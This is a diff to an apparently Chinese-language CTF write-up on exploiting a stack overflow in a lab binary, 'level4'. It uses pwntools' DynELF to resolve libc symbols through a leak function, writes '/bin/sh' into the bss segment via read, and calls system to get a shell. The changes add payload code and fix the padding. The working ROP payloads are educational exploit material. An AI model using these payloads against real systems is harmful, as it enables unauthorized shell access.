@@ -42,6 +42,7 @@ ssize_t vulnerable_function()
 
 ### DynELF--Resolving remote functions using leaks
 
+Resolve symbols in loaded, dynamically-linked ELF binaries. Given a function which can leak data at an arbitrary address, any symbol in any loaded library can be resolved.
 解析加载的，动态链接的ELF二进制文件中的symbols。给定一个可以在任意地址泄漏数据的函数，可以解析任何加载库中的任何symbols。
 
 参数：
@@ -79,7 +80,7 @@ def leak(address):
     conn.sendline(payload1)
     data=conn.recv(4)
     return data 
-d=DynELF(leak,elf)
+d=DynELF(leak,elf=ELF('./level4'))
 ```
 
 ### 第二步 求出system函数的地址和把'/bin/sh'写进bss段
@@ -111,6 +112,12 @@ system_addr = d.lookup('system', 'libc')
 
 read_addr = elf.symbols['read']
 
+利用read函数把 字符串'/bin/sh\x00'写入bss段
+```
+payload2='a'*(0x88+4) +p32(read_plt)+p32(vul_addr)+p32(0)+p32(bss_addr)+p32(8)
+conn.sendline(payload2)
+conn.send("/bin/sh\x00")
+```
 ### 第三步 就是getshell了
 
 exp:
@@ -139,7 +146,7 @@ read_plt=e.symbols['read']
 payload2='a'*(0x88+4) +p32(read_plt)+p32(vul_addr)+p32(0)+p32(bss_addr)+p32(8)
 conn.sendline(payload2)
 conn.send("/bin/sh\x00")
-payload3="a"*pad+"BBBB"+p32(system_addr)+'dead'+p32(bss_addr)
+payload3='a'*(0x88+4)+p32(system_addr)+'dead'+p32(bss_addr)
 conn.sendline(payload3)
 conn.interactive()
 ```
